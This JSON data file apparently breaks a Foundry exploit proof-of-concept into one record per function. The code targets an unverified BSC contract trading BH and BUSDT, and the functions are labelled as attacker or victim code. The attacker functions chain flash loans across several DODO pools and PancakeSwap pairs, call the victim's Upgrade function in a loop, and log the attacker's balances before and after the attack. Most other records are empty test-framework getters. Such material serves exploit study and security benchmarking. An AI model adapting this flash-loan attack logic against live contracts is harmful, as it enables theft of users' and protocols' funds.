[
  {
    "contract/interface": "IUnverifiedContract1",
    "source_type": "victim_contract",
    "function_name": "Upgrade",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        if (abi.decode(data, (uint256)) == uint256(0)) {\n            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), abi.encode(1));\n        } else if (abi.decode(data, (uint256)) == uint256(1)) {\n            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), abi.encode(2));\n        } else if (abi.decode(data, (uint256)) == uint256(2)) {\n            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), abi.encode(3));\n        } else if (abi.decode(data, (uint256)) == uint256(3)) {\n            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), abi.encode(4));\n        } else {\n            WBNB_BUSDT.swap(10_000_000 * 1e18, 0, address(this), abi.encode(0));\n        }\n        BUSDT.transfer(msg.sender, quoteAmount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        BUSDT_USDC.flash(address(this), 15_000_000 * 1e18, 0, abi.encode(0));\n        BUSDT.transfer(address(WBNB_BUSDT), amount0 + 60_000 * 1e18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        BUSDT.approve(address(UnverifiedContract1), type(uint256).max);\n        BUSDT.approve(address(Router), type(uint256).max);\n        BH.approve(address(UnverifiedContract1), type(uint256).max);\n\n        uint8 i;\n        while (i < 12) {\n            UnverifiedContract1.Upgrade(lpToken);\n            ++i;\n        }\n\n        // Adding liquidity.\n        (bool success,) =\n            address(UnverifiedContract1).call(abi.encodeWithSelector(bytes4(0x33688938), 3_000_000 * 1e18));\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 32_512_073);\n        vm.label(address(BUSDT), \"BUSDT\");\n        vm.label(address(BH), \"BH\");\n        vm.label(address(DPPOracle1), \"DPPOracle1\");\n        vm.label(address(DPPOracle2), \"DPPOracle2\");\n        vm.label(address(DPPOracle3), \"DPPOracle3\");\n        vm.label(address(DPPAdvanced), \"DPPAdvanced\");\n        vm.label(address(DPP), \"DPP\");\n        vm.label(address(WBNB_BUSDT), \"WBNB_BUSDT\");\n        vm.label(address(BUSDT_USDC), \"BUSDT_USDC\");\n        vm.label(address(UnverifiedContract1), \"UnverifiedContract1\");\n        vm.label(address(Router), \"Router\");\n        vm.label(lpToken, \"lpToken\");\n        vm.label(unverifiedContractAddr2, \"unverifiedContractAddr2\");\n        vm.label(busdt_bh_lp, \"busdt_bh_lp\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(BUSDT), address(this), 0);\n\n        emit log_named_decimal_uint(\n            \"Attacker BUSDT balance before attack\", BUSDT.balanceOf(address(this)), BUSDT.decimals()\n        );\n\n        emit log_named_decimal_uint(\"Attacker BH balance before attack\", BH.balanceOf(address(this)), BH.decimals());\n\n        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), abi.encode(0));\n\n        emit log_named_decimal_uint(\n            \"Attacker BUSDT balance after attack\", BUSDT.balanceOf(address(this)), BUSDT.decimals()\n        );\n\n        emit log_named_decimal_uint(\"Attacker BH balance after attack\", BH.balanceOf(address(this)), BH.decimals());\n    }\n\n",
    "description": ""
  }
]